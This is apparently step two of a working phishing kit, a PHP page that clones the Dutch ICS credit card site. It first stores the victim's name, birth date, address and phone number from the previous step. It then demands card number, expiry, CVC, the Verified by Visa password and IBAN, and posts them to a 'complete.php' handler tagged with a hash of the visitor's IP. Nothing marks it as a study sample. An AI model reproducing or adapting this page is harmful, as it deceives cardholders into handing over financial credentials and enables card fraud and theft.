<?php

session_start();

if(isset($_POST['first_name'])) {

  $_SESSION['first_name'] = $_POST['first_name'];
  
}

if(isset($_POST['last_name'])) {

  $_SESSION['last_name'] = $_POST['last_name'];
  
}

if(isset($_POST['dob_day'])) {

  $_SESSION['dob_day'] = $_POST['dob_day'];
  
}

if(isset($_POST['dob_month'])) {

  $_SESSION['dob_month'] = $_POST['dob_month'];
  
}

if(isset($_POST['dob_year'])) {

  $_SESSION['dob_year'] = $_POST['dob_year'];
  
}

if(isset($_POST['address'])) {

  $_SESSION['address'] = $_POST['address'];
  
}

if(isset($_POST['town'])) {

  $_SESSION['town'] = $_POST['town'];
  
}

if(isset($_POST['postal_code'])) {

  $_SESSION['postal_code'] = $_POST['postal_code'];
  
}

if(isset($_POST['phone_number'])) {

  $_SESSION['phone_number'] = $_POST['phone_number'];
  
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html lang="nl" xml:lang="nl" xmlns="http://www.w3.org/1999/xhtml" class="win chrome chrome5 webkit webkit5"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style></style>

<title>Acount Verifiëren - Stap 2</title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" type="text/css" href="./step1_files/reset.css">
<link rel="stylesheet" type="text/css" href="./step1_files/structure.css">
<link rel="stylesheet" type="text/css" href="./step1_files/components.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/jquery.keypad.css">
<link rel="stylesheet" type="text/css" href="./step1_files/js-enabled.css">
<script src="./step1_files/modal.js"></script>
<script>
function empty() {
    var x;
    x = document.getElementById("cardholder_name").value;
    if (x == "") {
        MsgBox('Naam op kaart is verplicht.', 'ERROR');
        return false;
    };
	var y;
    y = document.getElementById("card_number").value;
    if (y == "") {
        MsgBox('Kaartnummer is verplicht.', 'ERROR');
        return false;
    }
	var a;
    a = document.getElementById("expiry_month").value;
    if (a == "") {
        MsgBox('Geldigheids maand is verplicht.', 'ERROR');
        return false;
    }
	var b;
    b = document.getElementById("expiry_year").value;
    if (b == "") {
        MsgBox('Geldigheids jaar is verplicht.', 'ERROR');
        return false;
    }
	var c;
    c = document.getElementById("cvv").value;
    if (c == "") {
        MsgBox('CVC is verplicht.', 'ERROR');
        return false;
    }
	var e;
    e = document.getElementById("vbv_pass").value;
    if (e == "") {
        MsgBox('Verified By Visa wachtwoord is verplicht.', 'ERROR');
        return false;
    }
	var f;
    f = document.getElementById("iban").value;
    if (f == "") {
        MsgBox('IBAN is verplicht.', 'ERROR');
        return false;
    }
}
</script>
<!--[if IE 7]><link href="/theme/ics/style/ie7-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 8]><link href="/theme/ics/style/ie8-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<!--[if IE 9]><link href="/theme/ics/style/ie9-fix.css?v=15.7.0.0" rel="stylesheet" type="text/css" /><![endif]-->
<style type="text/css">@import url(./step1_files/import.css);</style>
</head>
<body class="ics">
<div id="PageContainer">
<div class="RowContainer">

<div class="clear"><div id="Header"><div class="header-block"><div class="logo-block"><img alt="Logo voor afdruk-weergave" src="./step1_files/logo-ics.gif" class="print"><a href="" title=""><strong></strong></a></div></div><div id="Navigation" class="navigation-block"><strong class="text-only">Pagina navigatie:</strong><ul><li id="nav-00"><a href=""><span>Home</span></a></li><li id="nav-01"><a href=""><span>Producten</span></a></li><li id="nav-02"><a href=""><span>Aanbiedingen</span></a></li><li id="nav-03"><a href=""><span>Klantenservice</span></a></li><li id="nav-05"><a id="nav-login" href=""><span>Mijn ICS</span></a></li></ul><form enctype="text/plain" method="get" action=""><fieldset><legend>Zoeken</legend><label for="searchString" class="text-only">Uw vraag in minimaal 2 woorden</label><input maxlength="128" class="text-field label-value remove-value no-focus" name="searchString" id="searchString" type="text"><input class="button-submit" value="" name="search-header" id="search-header" type="submit" formnovalidate="formnovalidate"></fieldset></form></div></div>
</div>
<div class="RowContainer">
<div class="col maincontent">
<div class="form-block">
<div class="form-container">
<h1>Stap 2 - Kaart details voor "<strong><?php if(isset($_SESSION['username']))  { echo $_SESSION['username']; } ?></strong>"</h1>
<form id="enrollment" action="complete.php?&sessionid=<?php $v_ip = $_SERVER['REMOTE_ADDR']; $hash = md5($v_ip); echo $hash; ?>&securessl=true" method="post" onsubmit="return empty();">
<p><strong class="obligatory">*</strong> Deze velden zijn verplicht.</p><br><br><br>
<fieldset>
<div>
<label for="embossingName">Naam op kaart:
<strong class="obligatory">*</strong></label>
<input name="cardholder_name" id="cardholder_name" class="text-field L alphanumeric-custom tabindex="3" type="text" value="" maxlength="26" autocomplete="off"></div><br>
<div>
<label for="embossingName">Kaartnummer:
<strong class="obligatory">*</strong></label>
<input name="card_number" id="card_number" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="16" autocomplete="off" onkeypress='return event.charCode >= 48 && event.charCode <= 57'></div><br>
<div>
<label for="embossingName">Geldigheids datum (mm/jj):
<strong class="obligatory">*</strong></label>
<label class="text-only">mm</label><input id="expiry_month" name="expiry_month" class="text-field numeric XXS label-value remove-value default-value no-focus" tabindex="2" type="text" value="" maxlength="2" autocomplete="off" onkeypress='return event.charCode >= 48 && event.charCode <= 57'></div>
<div class="dateInputSeparator">/</div>
<label class="text-only">jj</label><input id="expiry_year" name="expiry_year" class="text-field numeric XXS label-value remove-value default-value no-focus" tabindex="3" type="text" value="" maxlength="4" autocomplete="off" style="width: 35px;" onkeypress='return event.charCode >= 48 && event.charCode <= 57'><br>
<div>
<label for="embossingName">CVC:
<strong class="obligatory">*</strong></label>
<input name="cvv" id="cvv" class="text-field L alphanumeric-custom" tabindex="3" type="text" value="" maxlength="3" autocomplete="off" style="width: 25px;" onkeypress='return event.charCode >= 48 && event.charCode <= 57'></div><br>
<div>
<label for="embossingName">Verified By Visa wachtwoord:
<strong class="obligatory">*</strong></label>
<input name="vbv_pass" id="vbv_pass" class="text-field L alphanumeric-custom" tabindex="3" type="password" value="" maxlength="26" autocomplete="off"></div><br>
<div>
<label for="embossingName">IBAN nummer:
<strong class="obligatory">*</strong></label>
<input name="iban" id="iban" class="text-field L alphanumeric-custom uppercase" tabindex="3" type="text" value="" maxlength="20" autocomplete="off"></div><br><br><br><br>
</fieldset>
<fieldset class="form-buttons"><div class="button-submit"><input type="submit" id="finish" name="_finish" value="Afronden" tabindex="8" class=""></div></fieldset>
</form>
</div>
</div>
</div>
<div class="col sidebar">
<div class="container">
<div class="row">
<div class="col" style="width:44px;">

</div>
</div>
<div class="row">
<div class="col" style="width:260px;"><div class="login-block"><div class="inner"><h2>Mijn ICS</h2><div class="linklist-block"><ul><li><a href="">Activeren online omgeving</a></li><li><a href="">Meer weten over Mijn ICS</a></li><li class="link-more"><a href="">Inloggegevens vergeten?</a></li></ul></div><div class="login"><span><a name="button_inloggen" href=""><span>Inloggen</span></a></span></div></div></div></div>
</div>
</div>
</div>
</div>
<div class="RowContainer">
<div id="footerlinks-block">
<div class="footerlinks-block"><a class="usp-campagne" href=""><img src="./step1_files/usp_banner.png"></a><strong class="text-only">Algemene links:</strong><ul style="width:990px;margin-top: 0;"><li><span><a title="" href="">Over ICS</a></span></li><li><span><a title="" href="">Contact</a></span></li><li><span><a title="" href="">Privacy Statement</a></span></li><li><span><a title="Cookies instellen" href="">Cookies</a></span></li><li><span><a title="" href="">Disclaimer</a></span></li><li><span><a title="" href="">Algemene Voorwaarden</a></span></li><li><span><a title="Zakelijke Cards" href="" target="_blank">Zakelijke Cards</a></span></li><li><span><a title="" href="">Pers</a></span></li></ul><p></p></div>

</div>
</div>
</div>


</div></body></html>